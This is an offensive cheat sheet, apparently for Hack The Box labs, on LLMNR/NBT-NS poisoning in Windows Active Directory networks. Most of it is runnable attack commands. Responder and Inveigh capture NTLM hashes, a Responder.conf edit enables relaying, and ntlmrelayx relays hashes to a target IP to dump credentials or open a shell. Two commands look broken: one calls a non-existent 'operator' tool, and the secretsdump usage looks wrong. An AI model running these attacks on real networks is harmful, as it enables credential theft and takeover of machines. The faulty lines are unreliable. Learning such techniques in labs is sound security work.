> [!note] Cheat Sheet: Hash Interception and Network Spoofing (LLMNR / NBT-NS Poisoning)

This category of tools is used to intercept authentication on Windows networks (Active Directory). When a machine can't find a resource via DNS, it sends out a broadcast request. These utilities respond to the request with "I'm the one you need," and trick the victim into giving up their NTLM hash (password).

### 1. Responder

The main tool for Kali Linux. It can be run externally (via VPN or directly connected to the local network).

Run with a network interface specified (main flag, tun0 for HTB VPN):
```
sudo responder -I tun0
```

Run in analyzer mode (no response, only passive request collection):
```
sudo operator -I tun0 -A
```

Enable forced response to WPAD requests (often needed for proxy interception):
```
sudo responder -I tun0 -w
```

Enable verbose mode:
```
sudo responder -I tun0 -v
```

> [!warning] Important tip (SMB Relay Attack): If you want to not just crack the hash, but immediately use it to log into another machine (Relay Attack), you need to open the file `/etc/responder/Responder.conf` (or `/usr/share/responder/Responder.conf`) and change the `SMB = On` and `HTTP = On` parameters to `Off`. Otherwise, Responder will occupy ports and won't give the hash to the next tool.

### 2. Inveigh

Similar to Responder, but for running inside a compromised Windows machine (Post-Exploitation). If you've compromised Windows and want to collect hashes locally, use this one.

Running basic interception via PowerShell directly on the compromised machine:
```
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y
```

### 3. ntlmrelayx (from the Impacket package)

A companion tool to Responder. If Responder simply "catches" hashes, then ntlmrelayx takes the captured hash and immediately forwards it to another server to gain admin access there.

Forwarding the captured NTLM hash to the target IP (10.10.10.20) to dump passwords (you must first disable SMB/HTTP in Responder.conf):
```
impacket-ntlmrelayx -t 10.10.10.20 -c "secretsdump.py"
```

Forwarding the hash to the target to obtain an interactive shell:
```
impacket-ntlmrelayx -t 10.10.10.20 -i
```
